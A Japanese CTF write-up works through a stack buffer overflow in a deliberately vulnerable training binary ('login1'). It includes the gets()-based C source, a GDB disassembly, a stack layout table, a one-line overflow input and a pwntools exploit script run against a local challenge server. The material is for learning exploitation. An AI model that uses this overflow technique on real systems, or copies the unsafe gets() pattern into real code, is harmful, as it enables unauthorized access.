### 第2章：login1（スタックバッファオーバーフロー1）

#### 2.1：問題の概要

ソースコード（login1.c）と、プログラムバイナリ（login1）が提供されています。

[前回](https://daisuke20240310.hatenablog.com/entry/kaidai_1)、紹介した、docker を起動しておき、ブラウザにアクセスします。下図のように、それぞれのリンクをクリックすることで、ダウンロードすることが出来ます。

<figure class="figure-image figure-image-fotolife" title="login1">[f:id:daisuke20240310:20250512222106p:plain:alt=login1]<figcaption>login1</figcaption></figure>

#### 実践

まずは、自力でやっていきます。

表層解析します。あ、実行権限がないので付与しておきます。また、最初から、glibc-2.31 に依存ライブラリを変更しておきます（方法、経緯などは、[システムにインストールされたものと異なるバージョンのglibcを使う方法](https://daisuke20240310.hatenablog.com/entry/glibc) を参考にしてください）。

```sh
$ chmod +x login1

$ cp ./login1 ./login1_patch

$ patchelf --set-rpath /home/user/svn/oss/glibc231/lib/x86_64-linux-gnu --set-interpreter /home/user/svn/oss/glibc231/lib/x86_64-linux-gnu/ld-2.31.so ./login1_patch 

$ ldd ./login1_patch 
	linux-vdso.so.1 (0x00007ffec29b2000)
	libc.so.6 => /home/user/svn/oss/glibc231/lib/x86_64-linux-gnu/libc.so.6 (0x00007f17d423e000)
	/home/user/svn/oss/glibc231/lib/x86_64-linux-gnu/ld-2.31.so => /lib64/ld-linux-x86-64.so.2 (0x00007f17d4432000)

$ file login1_patch 
login1_patch: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /home/user/svn/oss/glibc231/lib/x86_64-linux-gnu/ld-2.31.so, for GNU/Linux 3.2.0, BuildID[sha1]=5c2c2e406f7a39e4a6d6b95d5a1f3f020d5a40c2, not stripped

$ ~/bin/checksec --file=login1_patch
RELRO          STACK CANARY     NX           PIE     RPATH     RUNPATH     Symbols     FORTIFY  Fortified  Fortifiable  FILE
Partial RELRO  No canary found  NX disabled  No PIE  No RPATH  RW-RUNPATH  75 Symbols  No       0          2            login1_patch

$ pwn checksec --file=login1_patch
[*] '/home/user/svn/experiment/kaidai_pwnable/chapter2/login1_patch'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x3ff000)
    RUNPATH:    b'/home/user/svn/oss/glibc231/lib/x86_64-linux-gnu'
    Stripped:   No
```

実行してみます。

問題サーバーにアクセスすると、flag.txt が用意されていると思いますが、ローカルで試すときには、自分で、flag.txt を準備する必要がありそうです。

問題文にあるように、ログインできるようにすればいいようです。

```sh
$ ./login1_patch 
Failed to read flag.txt

$ nano flag.txt

$ cat flag.txt 
flagflag

$ ./login1_patch 
ID: aaa
Password: bbb
Invalid ID or password
```

ソースコード（login1.c）を見ていきます。

setup関数は、環境準備のためのようです。main関数を見ると、ID は admin であることが分かります。Password は、flag.txt の中身自体のようです。

ok というローカル変数が 0 で初期化されていますが、1（非0）に書き換えることが出来れば、フラグが読み出せそうです。

```c
//  gcc login1.c -o login1 -fno-stack-protector -no-pie -fcf-protection=none
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char flag[0x20];

char *gets(char *s);

void setup()
{
    FILE *f = NULL;

    alarm(60);
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    f = fopen("flag.txt", "rt");
    if (f == NULL) {
        printf("Failed to read flag.txt\n");
        exit(0);
    }
    fscanf(f, "%s", flag);
    fclose(f);
}

int main()
{
    char id[0x20] = "";
    char password[0x20] = "";
    int ok = 0;

    setup();

    printf("ID: ");
    gets(id);
    printf("Password: ");
    gets(password);

    if (strcmp(id, "admin") == 0 &&
        strcmp(password, flag) == 0)
        ok = 1;

    if (ok) {
        printf("Login Succeeded\n");
        printf("The flag is: %s\n", flag);
    } else
        printf("Invalid ID or password\n");
}
```

GDB で起動して、スタックの状況を確認します。

```sh
$ gdb -q login1_patch
Reading symbols from login1_patch...

pwndbg> start
Temporary breakpoint 1 at 0x401290

pwndbg> disassemble
Dump of assembler code for function main:
   0x000000000040128c <+0>:     push   rbp
   0x000000000040128d <+1>:     mov    rbp,rsp
=> 0x0000000000401290 <+4>:     sub    rsp,0x50
   0x0000000000401294 <+8>:     mov    QWORD PTR [rbp-0x30],0x0
   0x000000000040129c <+16>:    mov    QWORD PTR [rbp-0x28],0x0
   0x00000000004012a4 <+24>:    mov    QWORD PTR [rbp-0x20],0x0
   0x00000000004012ac <+32>:    mov    QWORD PTR [rbp-0x18],0x0
   0x00000000004012b4 <+40>:    mov    QWORD PTR [rbp-0x50],0x0
   0x00000000004012bc <+48>:    mov    QWORD PTR [rbp-0x48],0x0
   0x00000000004012c4 <+56>:    mov    QWORD PTR [rbp-0x40],0x0
   0x00000000004012cc <+64>:    mov    QWORD PTR [rbp-0x38],0x0
   0x00000000004012d4 <+72>:    mov    DWORD PTR [rbp-0x4],0x0
   0x00000000004012db <+79>:    mov    eax,0x0
   0x00000000004012e0 <+84>:    call   0x4011b6 <setup>
   0x00000000004012e5 <+89>:    lea    rdi,[rip+0xd3f]        # 0x40202b
   0x00000000004012ec <+96>:    mov    eax,0x0
   0x00000000004012f1 <+101>:   call   0x401060 <printf@plt>
   0x00000000004012f6 <+106>:   lea    rax,[rbp-0x30]
   0x00000000004012fa <+110>:   mov    rdi,rax
   0x00000000004012fd <+113>:   call   0x401090 <gets@plt>
   0x0000000000401302 <+118>:   lea    rdi,[rip+0xd27]        # 0x402030
   0x0000000000401309 <+125>:   mov    eax,0x0
   0x000000000040130e <+130>:   call   0x401060 <printf@plt>
   0x0000000000401313 <+135>:   lea    rax,[rbp-0x50]
   0x0000000000401317 <+139>:   mov    rdi,rax
   0x000000000040131a <+142>:   call   0x401090 <gets@plt>
   0x000000000040131f <+147>:   lea    rax,[rbp-0x30]
   0x0000000000401323 <+151>:   lea    rsi,[rip+0xd11]        # 0x40203b
   0x000000000040132a <+158>:   mov    rdi,rax
   0x000000000040132d <+161>:   call   0x401080 <strcmp@plt>
   0x0000000000401332 <+166>:   test   eax,eax
   0x0000000000401334 <+168>:   jne    0x401354 <main+200>
   0x0000000000401336 <+170>:   lea    rax,[rbp-0x50]
   0x000000000040133a <+174>:   lea    rsi,[rip+0x2d7f]        # 0x4040c0 <flag>
   0x0000000000401341 <+181>:   mov    rdi,rax
   0x0000000000401344 <+184>:   call   0x401080 <strcmp@plt>
   0x0000000000401349 <+189>:   test   eax,eax
   0x000000000040134b <+191>:   jne    0x401354 <main+200>
   0x000000000040134d <+193>:   mov    DWORD PTR [rbp-0x4],0x1
   0x0000000000401354 <+200>:   cmp    DWORD PTR [rbp-0x4],0x0
   0x0000000000401358 <+204>:   je     0x401380 <main+244>
   0x000000000040135a <+206>:   lea    rdi,[rip+0xce0]        # 0x402041
   0x0000000000401361 <+213>:   call   0x401040 <puts@plt>
   0x0000000000401366 <+218>:   lea    rsi,[rip+0x2d53]        # 0x4040c0 <flag>
   0x000000000040136d <+225>:   lea    rdi,[rip+0xcdd]        # 0x402051
   0x0000000000401374 <+232>:   mov    eax,0x0
   0x0000000000401379 <+237>:   call   0x401060 <printf@plt>
   0x000000000040137e <+242>:   jmp    0x40138c <main+256>
   0x0000000000401380 <+244>:   lea    rdi,[rip+0xcdb]        # 0x402062
   0x0000000000401387 <+251>:   call   0x401040 <puts@plt>
   0x000000000040138c <+256>:   mov    eax,0x0
   0x0000000000401391 <+261>:   leave
   0x0000000000401392 <+262>:   ret
End of assembler dump.
```

スタックを可視化します。

| アドレス | サイズ | 内容 |
| - | - | - |
| rbp - 0x50 | 32 | password[32] |
| rbp - 0x30 | 32 | id[32] |
| rbp - 0x10 | 12 | 未使用 |
| rbp - 0x4 | 4 | ok |
| rbp |

なるほど、ID を入力するときに、32byte ではなく、48byte を書き込み、ok の領域を、非0 にすれば良さそうです。

```sh
$ python -c 'print("a" * 48, end="")' | ./login1_patch
ID: Password: Login Succeeded
The flag is: flagflag
```

フラグが表示されました。

問題サーバー向けにスクリプトを実装しました。

```python
#!/usr/bin/env python3
from pwn import *

bin_file = './login1_patch'
context(os = 'linux', arch = 'amd64')
context(terminal = ['tmux', 'splitw', '-h'])
context.log_level = 'debug'

binf = ELF( bin_file )

def attack( proc, **kwargs ):
    
    id       = "a" * 47 #48
    password = "b" * 31 #32
    
    proc.sendlineafter( 'ID: ', id.encode() )
    proc.sendlineafter( 'Password: ', password.encode() )
    
    info( proc.recvall() )

def main():
    
    adrs = "localhost"
    port = 10001
    
    #proc = gdb.debug( bin_file )
    #proc = process( bin_file )
    proc = remote( adrs, port )
    
    attack( proc )
    #proc.interactive()

if __name__ == '__main__':
    main()
```

実行してみます。

無事に、フラグが表示されました。

```sh
$ python exploit_login1.py
[*] '/home/user/svn/experiment/kaidai_pwnable/chapter2/login1_patch'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x3ff000)
    RUNPATH:    b'/home/user/svn/oss/glibc231/lib/x86_64-linux-gnu'
    Stripped:   No
[+] Opening connection to localhost on port 10001: Done
/home/user/20240819/lib/python3.11/site-packages/pwnlib/tubes/tube.py:841: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
[DEBUG] Received 0x4 bytes:
    b'ID: '
[DEBUG] Sent 0x30 bytes:
    b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n'
[DEBUG] Received 0xa bytes:
    b'Password: '
[DEBUG] Sent 0x20 bytes:
    b'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\n'
[+] Receiving all data: Done (52B)
[DEBUG] Received 0x34 bytes:
    b'Login Succeeded\n'
    b'The flag is: FLAG{58fd7d9bMJNTjnv5}\n'
[*] Closed connection to localhost port 10001
/home/user/20240819/lib/python3.11/site-packages/pwnlib/log.py:396: BytesWarning: Bytes is not text; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  self._log(logging.INFO, message, args, kwargs, 'info')
[*] Login Succeeded
    The flag is: FLAG{58fd7d9bMJNTjnv5}
```

<figure class="figure-image figure-image-fotolife" title="login1 Submit">[f:id:daisuke20240310:20250512225942p:plain:alt=login1 Submit]<figcaption>login1 Submit</figcaption></figure>
